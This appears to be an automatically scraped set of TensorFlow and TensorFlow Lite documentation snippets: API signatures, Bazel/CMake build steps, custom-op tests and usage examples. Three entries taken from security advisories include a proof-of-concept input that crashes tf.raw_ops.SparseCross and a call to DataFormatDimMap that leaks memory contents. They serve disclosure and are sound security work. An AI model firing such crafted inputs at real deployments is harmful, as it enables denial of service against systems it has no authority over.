tflite_support.task.vision.ImageSegmenter(
    options: tflite_support.task.vision.ImageSegmenterOptions,
    segmenter: _CppImageSegmenter
) -> None
```

----------------------------------------

TITLE: Testing Custom Op with Valid Integer Inputs (Graph/Eager)
DESCRIPTION: This test case verifies the custom multiplex op with valid integer TensorFlow tensors. It uses the `@test_util.run_in_graph_and_eager_modes` decorator to execute the test logic in both TensorFlow's graph and eager execution modes, comparing the result against the expected output derived from `np.where`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_1/README.md#_snippet_8

LANGUAGE: python
CODE:
```
  @test_util.run_in_graph_and_eager_modes
  def test_multiplex_int(self):
    a = tf.constant([1, 2, 3, 4, 5])
    b = tf.constant([10, 20, 30, 40, 50])
    cond = tf.constant([True, False, True, False, True], dtype=bool)
    expect = np.where(self.evaluate(cond), self.evaluate(a), self.evaluate(b))
    # expected result is [1, 20, 3, 40, 5]
    result = multiplex_1_op.multiplex(cond, a, b)
    self.assertAllEqual(result, expect)
```

----------------------------------------

TITLE: Stopping Audio Recording in Python
DESCRIPTION: Defines the method to halt the ongoing audio recording. This stops the flow of audio data into the internal buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioRecord.md#_snippet_3

LANGUAGE: python
CODE:
```
stop() -> None
```

----------------------------------------

TITLE: Running TensorFlow Python Label Image Demo Bazel Bash
DESCRIPTION: Executes the Python label image script via the Bazel-generated binary wrapper (`label_image_py`). This runs the Python implementation of the image classification demo. The `label_image_py` executable must be created successfully by the Bazel build process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/label_image/README.md#_snippet_4

LANGUAGE: bash
CODE:
```
bazel-bin/tensorflow/examples/label_image/label_image_py
```

----------------------------------------

TITLE: Installing JAX Nightly Python
DESCRIPTION: Provides the pip commands to install the latest nightly build of jaxlib and the head of the JAX repository from GitHub. This is necessary to access the newest PJRT plugin integration features before they are released as stable versions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/pjrt/pjrt_integration.md#_snippet_2

LANGUAGE: python
CODE:
```
pip install --pre -U jaxlib -f https://storage.googleapis.com/jax-releases/jaxlib_nightly_releases.html

pip install git+https://github.com/google/jax
```

----------------------------------------

TITLE: Creating Validation Config with Output Generation (Java)
DESCRIPTION: Shows an alternative way to create a CustomValidationConfig where the Acceleration Service internally generates the golden outputs. Instead of providing golden outputs directly, you provide golden inputs and specify a 'golden' AccelerationConfig (like a known good CPU config) that the service will use to generate the expected outputs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/acceleration_service.md#_snippet_5

LANGUAGE: Java
CODE:
```
ValidationConfig validationConfig = new CustomValidationConfig.Builder()
   .setBatchSize(5)
   .setGoldenInputs(inputs)
   .setGoldenConfig(customCpuAccelerationConfig)
   [...] /* other builder calls */
   .build();
```

----------------------------------------

TITLE: Run Cross-compiled Unit Tests (CTest CPU)
DESCRIPTION: Executes the cross-compiled TensorFlow Lite unit tests designed to run on the CPU backend using the CTest utility on the target device. The `-L plain` option filters tests by their label, targeting those configured for CPU execution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_12

LANGUAGE: sh
CODE:
```
ctest -L plain
```

----------------------------------------

TITLE: Apply Style Transform and Visualize - Python
DESCRIPTION: Applies a pre-calculated style bottleneck to a preprocessed content image using the `run_style_transform` function. The resulting stylized image is then displayed using the `imshow` function. Requires the `run_style_transform` and `imshow` functions, and input variables `style_bottleneck_blended` and `preprocessed_content_image`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/style_transfer/overview.ipynb#_snippet_9

LANGUAGE: python
CODE:
```
stylized_image_blended = run_style_transform(style_bottleneck_blended,
                                             preprocessed_content_image)

# Visualize the output.
imshow(stylized_image_blended, 'Blended Stylized Image')
```

----------------------------------------

TITLE: Defining Build Rules for Custom TensorFlow Op (Bazel)
DESCRIPTION: This Bazel BUILD file snippet defines rules for building the 'multiplex_3' custom TensorFlow op. The 'tf_custom_op_library' rule compiles the C++ source files into a shared library ('.so'). The 'py_strict_library' rule creates a Python library ('multiplex_3_op') that includes the Python source file and depends on the compiled C++ kernel library (':multiplex_3_kernel.so'), as well as core TensorFlow and the previous 'multiplex_2' op.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_3/README.md#_snippet_9

LANGUAGE: Bazel
CODE:
```
tf_custom_op_library(
    name = "multiplex_3_kernel.so",
    srcs = [
        "multiplex_3_kernel.cc",
        "multiplex_3_op.cc",
    ],
)

py_strict_library(
    name = "multiplex_3_op",
    srcs = ["multiplex_3_op.py"],
    data = [":multiplex_3_kernel.so"],
    srcs_version = "PY3",
    deps = [
        "//third_party/py/tensorflow",
        "//third_party/tensorflow/examples/custom_ops_doc/multiplex_2:multiplex_2_op",
    ],
)
```

----------------------------------------

TITLE: Defining Minimal Executable and C++ Standard (CMake)
DESCRIPTION: Sets the required C++ standard for the project to C++17. It then defines an executable target named `minimal` using the source file `minimal.cc`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/minimal/CMakeLists.txt#_snippet_3

LANGUAGE: CMake
CODE:
```
set(CMAKE_CXX_STANDARD 17)
add_executable(minimal
  minimal.cc
)
```

----------------------------------------

TITLE: Running TensorFlow Lite Minimal Executable
DESCRIPTION: Executes the compiled minimal TensorFlow Lite program. It requires a path to a TensorFlow Lite model file as a command-line argument for inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/minimal/README.md#_snippet_5

LANGUAGE: sh
CODE:
```
./minimal <path/to/tflite/model>
```

----------------------------------------

TITLE: Install OVIC Benchmarker APK - ADB Shell
DESCRIPTION: Installs or updates the built OVIC benchmarker APK file onto a connected Android device using the Android Debug Bridge (`adb`). The `-r` flag allows reinstalling the application, keeping its data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/java/ovic/README.md#_snippet_12

LANGUAGE: sh
CODE:
```
adb install -r bazel-bin/tensorflow/lite/java/ovic/demo/app/ovic_benchmarker_binary.apk
```

----------------------------------------

TITLE: Initializing TFLite Interpreter with GPU Delegate - C (before 2.4.0)
DESCRIPTION: Demonstrates using the TensorFlow Lite C API to initialize the interpreter and attach the GPU delegate. Load the model, create interpreter options, instantiate the GPU delegate with `TFLGPUDelegateCreate`, add the delegate to the options, create the interpreter, allocate tensors, manage input/output tensors, invoke inference, and finally clean up resources. This API is necessary for TFLite versions earlier than 2.4.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/ios/delegates/gpu.md#_snippet_4

LANGUAGE: C
CODE:
```
#include "tensorflow/lite/c/c_api.h"
#include "tensorflow/lite/delegates/gpu/metal_delegate.h"

// Initialize model
TfLiteModel* model = TfLiteModelCreateFromFile(model_path);

// Initialize interpreter with GPU delegate
TfLiteInterpreterOptions* options = TfLiteInterpreterOptionsCreate();
TfLiteDelegate* metal_delegate = TFLGPUDelegateCreate(nil);  // default config
TfLiteInterpreterOptionsAddDelegate(options, metal_delegate);
TfLiteInterpreter* interpreter = TfLiteInterpreterCreate(model, options);
TfLiteInterpreterOptionsDelete(options);

TfLiteInterpreterAllocateTensors(interpreter);

NSMutableData *input_data = [NSMutableData dataWithLength:input_size * sizeof(float)];
NSMutableData *output_data = [NSMutableData dataWithLength:output_size * sizeof(float)];
TfLiteTensor* input = TfLiteInterpreterGetInputTensor(interpreter, 0);
const TfLiteTensor* output = TfLiteInterpreterGetOutputTensor(interpreter, 0);

// Run inference
TfLiteTensorCopyFromBuffer(input, inputData.bytes, inputData.length);
TfLiteInterpreterInvoke(interpreter);
TfLiteTensorCopyToBuffer(output, outputData.mutableBytes, outputData.length);

// Clean up
TfLiteInterpreterDelete(interpreter);
TFLGpuDelegateDelete(metal_delegate);
TfLiteModelDelete(model);
```

----------------------------------------

TITLE: Plotting Combined Pre-training and On-Device Loss Python
DESCRIPTION: Visualizes the loss curves from both the initial pre-training phase and the subsequent on-device training phase on the same plot using Matplotlib. This shows how on-device training continues from the pre-trained state.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_14

LANGUAGE: python
CODE:
```
plt.plot(epochs, losses, label='Pre-training')
plt.plot(more_epochs, more_losses, label='On device')
plt.ylim([0, max(plt.ylim())])
plt.xlabel('Epoch')
plt.ylabel('Loss [Cross Entropy]')
plt.legend();
```

----------------------------------------

TITLE: Generating Xcode Project with Tulsi (Shell)
DESCRIPTION: Runs the 'generate_xcodeproj.sh' script, typically found in the Tulsi repository, to create an Xcode project from a Bazel configuration. It specifies the Tulsi project configuration file and the desired output path for the generated '.xcodeproj' file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/swift/README.md#_snippet_6

LANGUAGE: shell
CODE:
```
generate_xcodeproj.sh --genconfig tensorflow/lite/swift/TensorFlowLite.tulsiproj:TensorFlowLite --outputfolder ~/path/to/generated/TensorFlowLite.xcodeproj
```

----------------------------------------

TITLE: Build TensorFlow Lite C Library (Windows) sh
DESCRIPTION: Configures and builds the TensorFlow Lite C library using CMake on Windows systems. It specifically targets the Release configuration using `--config Release`. Prerequisites include CMake and the TensorFlow source code at the specified path. The `-j` flag enables parallel building.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_22

LANGUAGE: sh
CODE:
```
cmake ../tensorflow_src/tensorflow/lite/c
cmake --build . -j --config Release
```

----------------------------------------

TITLE: Configure TFLite Debug Build with CMake
DESCRIPTION: Runs the CMake configuration command to set up a debug build of the TensorFlow Lite library. Including the `-DCMAKE_BUILD_TYPE=Debug` option ensures that the compiled binary contains symbol information necessary for debugging tools.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_4

LANGUAGE: sh
CODE:
```
cmake ../tensorflow_src/tensorflow/lite -DCMAKE_BUILD_TYPE=Debug
```

----------------------------------------

TITLE: Defining Bazel Build Rules for TensorFlow Custom Op
DESCRIPTION: Specifies Bazel build rules to compile the Python wrapper (`py_strict_library`) and configure the Python tests (`cuda_py_test`). It lists source files, data dependencies (kernel .so), standard Python dependencies, and build options like visibility and tags.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_2/README.md#_snippet_9

LANGUAGE: bazel
CODE:
```
py_strict_library(
    name = "multiplex_2_op",
    srcs = ["multiplex_2_op.py"],
    data = ["multiplex_2_kernel.so"],
    srcs_version = "PY3",
    visibility = ["//third_party/tensorflow/examples/custom_ops_doc:__subpackages__"],
    deps = [
        "//third_party/py/tensorflow",
    ],
)

cuda_py_test(
    name = "multiplex_2_test",
    size = "medium",
    srcs = ["multiplex_2_test.py"],
    python_version = "PY3",
    srcs_version = "PY3",
    tags = [
        "no_mac",  # TODO(b/216321151): Re-enable this test.
    ],
    deps = [
        ":multiplex_2_op",
        "//third_party/py/numpy",
        "//third_party/py/tensorflow",
        "//third_party/tensorflow/python/framework:errors",
        "//third_party/tensorflow/python/framework:test_lib",
    ],
)
```

----------------------------------------

TITLE: Cloning TensorFlow Repo - Git Shell
DESCRIPTION: Clones the TensorFlow repository from GitHub, including all necessary submodules. Cloning with the `--recurse-submodules` flag is essential to avoid issues, such as those related to protobuf compilation, required for building the project.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/experimental/delegate_performance/android/README.md#_snippet_0

LANGUAGE: Shell
CODE:
```
git clone --recurse-submodules https://github.com/tensorflow/tensorflow.git
```

----------------------------------------

TITLE: Writing TFLite Model to File using ModelWriter (C++)
DESCRIPTION: Demonstrates how to save a TFLite model from an `Interpreter` object to a file in the flatbuffer format using `tflite::ModelWriter`. Requires a built or modified `Interpreter` instance. The filename specifies the output path. Does not support custom I/O tensors or custom ops currently but supports models with Control Flow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/serialization/README.md#_snippet_0

LANGUAGE: C++
CODE:
```
std::unique_ptr<tflite::Interpreter> interpreter; // ...build/modify
interpreter... tflite::ModelWriter writer(interpreter.get()); std::string
filename = "/tmp/model.tflite"; writer.Write(filename);
```

----------------------------------------

TITLE: Packing ModelMetadataT Object (Python)
DESCRIPTION: An instance method to pack the `ModelMetadataT` object into a builder. This is likely used for serialization into a FlatBuffers buffer using the provided builder object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadataT.md#_snippet_4

LANGUAGE: python
CODE:
```
Pack(
    builder
)

```

----------------------------------------

TITLE: while Loop with Python/NumPy Condition - Python
DESCRIPTION: A Python `while` loop where the condition is a Python/NumPy value. AutoGraph will execute this loop as normal Python control flow, as the condition is not a `tf.Tensor`. The loop runs natively in Python during tracing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_16

LANGUAGE: Python
CODE:
```
x = 0
while np.random.uniform() > 0.5:
  x = x + 1
```

----------------------------------------

TITLE: Running Basic JAX Tests Python
DESCRIPTION: Provides examples of fundamental JAX operations like basic arithmetic, jit compilation, and pmap parallelization. These snippets serve as simple test cases to verify that the registered PJRT plugin is functional and correctly handling JAX computations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/pjrt/pjrt_integration.md#_snippet_8

LANGUAGE: python
CODE:
```
# JAX 1+1
print(jax.numpy.add(1, 1))
# => 2

# jit
print(jax.jit(lambda x: x * 2)(1.))
# => 2.0

# pmap

arr = jax.numpy.arange(jax.device_count()) print(jax.pmap(lambda x: x +
jax.lax.psum(x, 'i'), axis_name='i')(arr))

# single device: [0]

# 4 devices: [6 7 8 9]
```

----------------------------------------

TITLE: Viewing Scope Memory Usage with TFProf
DESCRIPTION: This tfprof command provides a hierarchical view of memory consumption, aggregating bytes within operation scopes. It orders scopes by memory usage and filters to show only those exceeding a minimum byte threshold (100MB in this example). This helps pinpoint memory bottlenecks within specific parts of the model graph.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/profile_memory.md#_snippet_2

LANGUAGE: tfprof
CODE:
```
# With scope view, you can see the operations that outputs largest tensors.
tfprof> scope -order_by bytes -select bytes -min_bytes 100000000
```

----------------------------------------

TITLE: Running Custom TensorFlow Op Tests (Shell)
DESCRIPTION: This shell command uses the Bazel build tool to execute the tests defined for the 'multiplex_3' custom TensorFlow op. It targets the specific test rule '//third_party/tensorflow/google/g3doc/example/multiplex_3:multiplex_3_test', which is typically a 'tf_py_test' rule defined in the BUILD file, ensuring that the op functions correctly.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_3/README.md#_snippet_10

LANGUAGE: Shell
CODE:
```
bazel test //third_party/tensorflow/google/g3doc/example/multiplex_3:multiplex_3_test
```

----------------------------------------

TITLE: Add TFLite C API Dependency with Bazel (Python)
DESCRIPTION: Defines an Objective-C library target in a Bazel BUILD file, adding the TensorFlow Lite C API as a dependency for direct use.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ios.md#_snippet_7

LANGUAGE: Python
CODE:
```
# Using C API directly
objc_library(
  deps = [
      "//tensorflow/lite/c:c_api",
  ],
)
```

----------------------------------------

TITLE: Triggering SparseCross Type Confusion (Python)
DESCRIPTION: This Python code demonstrates how to trigger a denial-of-service vulnerability in `tf.raw_ops.SparseCross`. By providing arguments with mixed data types (`int64` and `string`) in specific ways (especially `values`), the operation encounters a type confusion issue during internal checks, leading to a `CHECK`-fail and program termination. It sets up various input tensors (`indices`, `values`, `shapes`, `dense_inputs`) and calls the operation with parameters designed to exploit the vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-008.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

hashed_output = False
num_buckets = 1949315406
hash_key = 1869835877
out_type = tf.string
internal_type = tf.string

indices_1 = tf.constant([0, 6], shape=[1, 2], dtype=tf.int64)
indices_2 = tf.constant([0, 0], shape=[1, 2], dtype=tf.int64)
indices = [indices_1, indices_2]

values_1 = tf.constant([0], dtype=tf.int64)
values_2 = tf.constant([72], dtype=tf.int64)
values = [values_1, values_2]

batch_size = 4
shape_1 = tf.constant([4, 122], dtype=tf.int64)
shape_2 = tf.constant([4, 188], dtype=tf.int64)
shapes = [shape_1, shape_2]

dense_1 = tf.constant([188, 127, 336, 0], shape=[4, 1], dtype=tf.int64)
dense_2 = tf.constant([341, 470, 470, 470], shape=[4, 1], dtype=tf.int64)
dense_3 = tf.constant([188, 188, 341, 922], shape=[4, 1], dtype=tf.int64)
denses = [dense_1, dense_2, dense_3]

tf.raw_ops.SparseCross(indices=indices, values=values, shapes=shapes, dense_inputs=denses, hashed_output=hashed_output,
                       num_buckets=num_buckets, hash_key=hash_key, out_type=out_type, internal_type=internal_type)
```

----------------------------------------

TITLE: Demonstrating DataFormatDimMap Vulnerability TensorFlow Python
DESCRIPTION: This snippet demonstrates a similar vulnerability in `tf.raw_ops.DataFormatDimMap` when provided with invalid `src_format` and `dst_format` attributes. Similar to `DataFormatVecPermute`, the lack of validation causes the operation to produce tensors filled with potentially uninitialized or arbitrary memory contents, highlighting the insecure behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-030.md#_snippet_1

LANGUAGE: python
CODE:
```
>>> tf.raw_ops.DataFormatDimMap(x=[[1,5],[2,6],[3,7],[4,8]], src_format='1234',
>>> dst_format='8765')
<tf.Tensor: shape=(4, 2), dtype=int32, numpy=
array([[1954047348, 1954047348],
       [1852793646, 1852793646],
       [1954047348, 1954047348],
       [1852793632, 1852793632]], dtype=int32)>
```

----------------------------------------

TITLE: TensorFlow C++ DLPack Status Not Checked
DESCRIPTION: These C++ lines highlight where the failure to check the `status` object occurs after calling functions (`TFE_TensorHandleDevicePointer`, `GetDlDataType`) that can set an error status. This allows execution to continue despite a preceding error, bypassing cleanup paths and causing the memory allocated earlier (shown in another snippet) to be leaked.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-024.md#_snippet_2

LANGUAGE: C++
CODE:
```
  dlm_tensor->dl_tensor.data = TFE_TensorHandleDevicePointer(h, status);
  dlm_tensor->dl_tensor.dtype = GetDlDataType(data_type, status);
```

----------------------------------------

TITLE: Setting Basic CMake Project Configuration
DESCRIPTION: Configures the minimum required CMake version (3.16), defines the project name ("minimal") for C and CXX languages, and introduces a build option `LINK_TFLITE_FLEX` to control linking the Flex delegate, defaulting to OFF.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/minimal/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
cmake_minimum_required(VERSION 3.16)
project(minimal C CXX)

option(LINK_TFLITE_FLEX "Enable tensorflowlite_flex library linkage" OFF)
```

----------------------------------------

TITLE: Conditional Assignment with Compound Symbol - Python
DESCRIPTION: A Python `if` statement performing a conditional assignment on a compound symbol, specifically a property `b` of an object `a`. This demonstrates AutoGraph's ability to handle more complex symbol references.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_6

LANGUAGE: Python
CODE:
```
if a.b < 0
  a.b = -a.b
```

----------------------------------------

TITLE: Creating TensorFlow Lite External Delegate - C
DESCRIPTION: This C function (`tflite_plugin_create_delegate`) is the entry point for dynamically loading a TensorFlow Lite delegate. It takes key-value options to configure the delegate and an optional error reporting function; it returns a `TfLiteDelegate` pointer or NULL on error.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/external/README.md#_snippet_0

LANGUAGE: C
CODE:
```
TfLiteDelegate* tflite_plugin_create_delegate(
  char** options_keys, char** options_values, size_t num_options,
  void (*report_error)(const char *))
```

----------------------------------------

TITLE: Calling TensorMetadataStart Function in Python
DESCRIPTION: This function initiates the construction of a `TensorMetadata` flatbuffer object using a provided builder. It is a crucial step when generating metadata for TensorFlow Lite models. The `builder` parameter is required to manage the flatbuffer serialization process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadataStart.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.TensorMetadataStart(
    builder
)
```

----------------------------------------

TITLE: Dumping TensorFlow Graph with XLA Clusters Shell
DESCRIPTION: Shell command using `TF_DUMP_GRAPH_PREFIX` and `TF_XLA_FLAGS` to dump the TensorFlow graph visualization. This visualization includes markers showing where XLA clusters have been identified and embedded within the graph.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/index.md#_snippet_10

LANGUAGE: Shell
CODE:
```
$ TF_DUMP_GRAPH_PREFIX=/tmp/generated TF_XLA_FLAGS="--tf_xla_clustering_debug"
```

----------------------------------------

TITLE: Declaring TensorFlow Lite Delegate Variable - Kotlin
DESCRIPTION: Declares a mutable integer variable within the helper class to hold the index of the selected hardware acceleration delegate. This variable determines whether the model will attempt to use CPU, GPU, or NNAPI for inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/question_answer.md#_snippet_3

LANGUAGE: Kotlin
CODE:
```
var currentDelegate: Int = 0
```

----------------------------------------

TITLE: Clearing TensorAudio Buffer in Python
DESCRIPTION: Resets the internal audio buffer of the `TensorAudio` instance. This method fills the entire buffer with zero values, effectively clearing any previously loaded audio data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/TensorAudio.md#_snippet_1

LANGUAGE: Python
CODE:
```
clear()
```

----------------------------------------

TITLE: Testing SparseTensor Op with Varying Shapes (Python)
DESCRIPTION: This Python test case validates the 'multiplex_2_op.multiplex' function when applied to sparse tensors ('tf.SparseTensor'). It constructs 'cond', 'a', and 'b' sparse tensors with potentially different dense shapes, evaluates the operation in both graph and eager modes, and asserts that the resulting sparse tensor has the expected dense shape, indices, and values, demonstrating the op's ability to handle input shape differences by expanding the output shape.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_3/README.md#_snippet_7

LANGUAGE: Python
CODE:
```
  @test_util.run_in_graph_and_eager_modes
  def test_sparse_op_different(self):
    cond = tf.SparseTensor(
        indices=[[1], [3], [6]], values=[True, False, True], dense_shape=[7])
    a = tf.SparseTensor(
        indices=[[1], [3], [5]], values=['a0', 'a1', 'a2'], dense_shape=[6])
    b = tf.SparseTensor(
        indices=[[0], [2], [3], [6]],
        values=['b0', 'b1', 'b2', 'b3'],
        dense_shape=[7])
    result = self.evaluate(multiplex_2_op.multiplex(cond, a, b))
    self.assertAllEqual([7], result.dense_shape)
    self.assertAllEqual([[0], [1], [2], [3]], result.indices)
    self.assertAllEqual([b'b0', b'a0', b'b1', b'b2'], result.values)
```

----------------------------------------

TITLE: Cross-Build TFLite Pip with Bazel & Flex - armhf Python 3.7 (Shell)
DESCRIPTION: Performs a cross-build of the TensorFlow Lite pip package using Bazel and `ci_build.sh`, enabling Flex delegate support. The `CI_DOCKER_EXTRA_PARAMS` variable is used to pass the `--define=tflite_pip_with_flex=true` flag to the Docker build environment, targeting armhf Python 3.7 using the `PI-PYTHON37` profile.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/pip_package/README.md#_snippet_15

LANGUAGE: sh
CODE:
```
CI_DOCKER_EXTRA_PARAMS="-e CUSTOM_BAZEL_FLAGS=--define=tflite_pip_with_flex=true" \
  tensorflow/tools/ci_build/ci_build.sh PI-PYTHON37 \
  tensorflow/lite/tools/pip_package/build_pip_package_with_bazel.sh armhf
```

----------------------------------------

TITLE: Analyze Bazel Profile - Shell
DESCRIPTION: Analyzes the profile generated by the `--profile` flag during the Bazel build or test run. This helps in identifying performance bottlenecks in the build process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_20

LANGUAGE: Shell
CODE:
```
bazel analyze-profile profile.json.gz
```

----------------------------------------

TITLE: Initializing ScaNN Options in Python
DESCRIPTION: Defines the constructor for the `ScaNNOptions` class, used to configure how a ScaNN index is built. It takes the distance measure type and optional parameters for tree partitioning, asymmetric hashing (`score_ah`), or brute force scoring (`score_brute_force`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/searcher/ScaNNOptions.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.searcher.ScaNNOptions(
    distance_measure: str,
    tree: Optional[<a href="../../tflite_model_maker/searcher/Tree"><code>tflite_model_maker.searcher.Tree</code></a>] = None,
    score_ah: Optional[<a href="../../tflite_model_maker/searcher/ScoreAH"><code>tflite_model_maker.searcher.ScoreAH</code></a>] = None,
    score_brute_force: Optional[<a href="../../tflite_model_maker/searcher/ScoreBruteForce"><code>tflite_model_maker.searcher.ScoreBruteForce</code></a>] = None
)
```

----------------------------------------

TITLE: Initializing QuestionAnswererResult Python
DESCRIPTION: Initializes an instance of the `QuestionAnswererResult` class. This object holds the results from a TensorFlow Lite question answering model. It requires a list of `QaAnswer` objects, each representing a potential answer found in the input text.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/QuestionAnswererResult.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.processor.QuestionAnswererResult(
    answers: List[<a href="../../../tflite_support/task/processor/QaAnswer"><code>tflite_support.task.processor.QaAnswer</code></a>]
)
```

----------------------------------------

TITLE: Add Associated Files using TFLite Metadata Builder (Python)
DESCRIPTION: This Python snippet shows the function signature for `ModelMetadataAddAssociatedFiles`. It is used to incorporate information about associated files (like labels, vocabularies, etc.) into the metadata structure of a TensorFlow Lite model during the metadata building process. It requires a builder object (presumably a FlatBuffers builder) and data representing the associated files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadataAddAssociatedFiles.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ModelMetadataAddAssociatedFiles(
    builder, associatedFiles
)
```

----------------------------------------

TITLE: Getting Text Model Configuration in TensorFlow
DESCRIPTION: Retrieves the configuration settings associated with the text model specification class. This method provides access to parameters defining the model's behavior and properties.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/BertQaSpec.md#_snippet_5

LANGUAGE: python
CODE:
```
get_config()

```

----------------------------------------

TITLE: Displaying Model Summary Python
DESCRIPTION: This method prints a summary of the underlying model architecture, similar to `model.summary()` in Keras.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/object_detector/ObjectDetector.md#_snippet_7

LANGUAGE: python
CODE:
```
summary()
```

----------------------------------------

TITLE: Creating Question Answer Model Base Structure in Python
DESCRIPTION: Returns the underlying Keras model structure used by the Question Answer task. This method typically provides access to the model built based on the provided model specification.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/QuestionAnswer.md#_snippet_2

LANGUAGE: python
CODE:
```
create_model()
```

----------------------------------------

TITLE: Getting Dataset Length with AudioDataLoader (Python)
DESCRIPTION: Implements the `__len__` method for the `AudioDataLoader` class, allowing the use of Python's built-in `len()` function. Returns the total count of the original audio files that were loaded into the DataLoader instance. It's important to note that this number reflects the source files, and the actual number of data samples used for training/evaluation might be different if audio framing (splitting long files into shorter clips) is applied.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/DataLoader.md#_snippet_5

LANGUAGE: python
CODE:
```
__len__()
```

----------------------------------------

TITLE: Summarizing Trained MobileBERT Model in Python
DESCRIPTION: Prints a summary of the trained MobileBERT model's architecture, including layer names, types, output shapes, and the number of parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_17

LANGUAGE: python
CODE:
```
model.summary()
```

----------------------------------------

TITLE: Clone TensorFlow Repository Bash
DESCRIPTION: This command clones the TensorFlow repository from GitHub, including its submodules. The `--recurse-submodules` flag is crucial for fetching dependencies like protobuf, which are required for a successful build from source. This is the first step before building the Android demo using Bazel or Android Studio with Bazel integration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/android/test/README.md#_snippet_1

LANGUAGE: bash
CODE:
```
git clone --recurse-submodules https://github.com/tensorflow/tensorflow.git
```

----------------------------------------

TITLE: AutoGraph Conversion of Conditional Assignment - TensorFlow Python
DESCRIPTION: The AutoGraph-transformed version of the Python `if` statement where the variable `a` is a `tf.Tensor`. The conditional assignment is converted into a `tf.cond` operation, executing the true or false branch based on the `tf.Tensor` condition `a < 0`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_5

LANGUAGE: Python
CODE:
```
a = tf.cond(a < 0, lambda: -a, lambda: a)
```

----------------------------------------

